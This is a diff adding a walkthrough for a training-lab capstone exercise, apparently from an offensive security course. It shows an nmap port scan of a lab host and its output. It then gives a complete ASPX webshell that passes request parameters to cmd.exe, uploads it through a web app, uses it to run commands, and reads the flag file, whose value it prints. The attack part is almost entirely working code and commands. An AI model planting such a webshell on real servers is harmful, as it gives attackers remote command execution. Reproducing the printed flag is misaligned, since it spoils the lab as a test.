@@ -387,6 +387,70 @@ Lab 3 - Capstone Lab: Start the Future Factor Authentication application on VM #
 
 Lab 4 - Capstone Lab: Enumerate the machine VM #4. Find the web application and get access to the system. The flag can be found in C:\inetpub\.
 >``` shell
+># Scan all TCP ports on the target to identify which ports are open (Target: 192.168.110.192)
+>kali@kali:~$ nmap -p- 192.168.110.192
 >
+># ========== Expected Result ==========
+>Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-19 08:10 CST
+>Nmap scan report for 192.168.110.192
+>Host is up (0.038s latency).
+>Not shown: 65521 closed tcp ports (reset)
+>PORT      STATE SERVICE
+>80/tcp    open  http
+>135/tcp   open  msrpc
+>139/tcp   open  netbios-ssn
+>445/tcp   open  microsoft-ds
+>5985/tcp  open  wsman
+>8000/tcp  open  http-alt
+>47001/tcp open  winrm
+>49664/tcp open  unknown
+>49665/tcp open  unknown
+>49666/tcp open  unknown
+>49667/tcp open  unknown
+>49668/tcp open  unknown
+>49669/tcp open  unknown
+>49670/tcp open  unknown
+>
+>Nmap done: 1 IP address (1 host up) scanned in 37.31 seconds
+># =====================================
+>
+># Create a ASPX webshell file to execute commands via the browser
+>kali@kali:~$ cat > shell.aspx
+>
+># Paste this content and, then Ctrl+C to save
+><%@ Page Language="C#" %>
+><%
+>    if (Request["cmd"] != null) {
+>        string strCmdText = Request["cmd"];
+>        System.Diagnostics.Process proc = new System.Diagnostics.Process();
+>        proc.StartInfo.FileName = "cmd.exe";
+>        proc.StartInfo.Arguments = "/c " + strCmdText;
+>        proc.StartInfo.UseShellExecute = false;
+>        proc.StartInfo.RedirectStandardOutput = true;
+>        proc.StartInfo.CreateNoWindow = true;
+>        proc.Start();
+>        string output = proc.StandardOutput.ReadToEnd();
+>        Response.Write(output);
+>    }
+>%>
+>
+># Visit the web interface on port 8000 and upload shell.aspx
+># - The web app confirms upload with: "Upload status: File uploaded!"
+>visit in browser: http://192.168.110.192:8000/
+>
+># Access the uploaded shell on port 80
+># - This executes the 'whoami' command on the server via your webshell
+>visit in browser: http://192.168.110.192/shell.aspx?cmd=whoami
+>
+># ========== Expected Result ==========
+>iis apppool\defaultapppool 
+># =====================================
+>
+># Use the webshell to read the contents of the flag file from C:\inetpub\
+>visit in browser: http://192.168.110.192/shell.aspx?cmd=type%20C:\inetpub\flag.txt 
+>
+># ========== Expected Result ==========
+>OS{60a764d777b314dc51617f82e56befa4}
+># =====================================
 >```
->
+>OS{60a764d777b314dc51617f82e56befa4} 
